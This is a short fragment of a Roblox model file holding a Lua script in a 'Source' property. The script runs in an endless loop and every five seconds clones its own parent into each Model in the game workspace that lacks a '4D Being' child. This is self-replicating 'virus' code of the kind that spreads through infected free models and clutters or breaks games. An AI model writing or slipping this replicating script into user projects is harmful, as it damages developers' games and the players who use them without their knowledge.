																	<string name="Source">function dive()


p= game.Workspace:GetChildren()	


for i= 1, #p do				


if p[i].className == &quot;Model&quot; and p[i]:findFirstChild(&quot;4D Being&quot;) == nil then


script.Parent.Parent:clone().Parent = p[i]


end


end


end





while true do


wait(5)


dive()


end


